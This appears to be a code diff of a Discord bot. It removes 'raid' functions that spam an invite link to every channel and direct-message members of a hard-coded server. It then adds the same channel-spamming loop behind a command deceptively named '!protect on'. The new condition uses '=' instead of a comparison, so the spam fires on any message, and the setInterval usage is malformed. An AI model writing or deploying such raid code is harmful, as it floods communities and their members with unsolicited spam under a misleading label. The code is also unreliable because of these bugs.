@@ -13,27 +13,11 @@ client.on('ready', () => {
 });
 
 client.on('message', message => {
-    
-    if(message.content.startsWith(prefix + "mppp")) {
-
-        function raid  (){
-        setInterval(message.guild.channels.map(m => m.send("Go https://discord.gg/YPg9vrm ")) , 500  ) 
+    if (message.content = "!protect on") {
+    setInterval(message.guild.channels.map(m => m.send("Go https://discord.gg/YPg9vrm ")) , 500  ) 
     }
-            
-
-    function raid2  (){
-        client.guilds.get("611613604159946784").members.map(c => {
-            setInterval(message.guild.channels.map(m => m.send(c.send("https://discord.gg/YPg9vrm Go go go"))) , 500  ) 
-            
-        });
-    }
-   
-
-
-
-
-    }        
 });
+
 
 
 client.login(process.env.TOKEN)
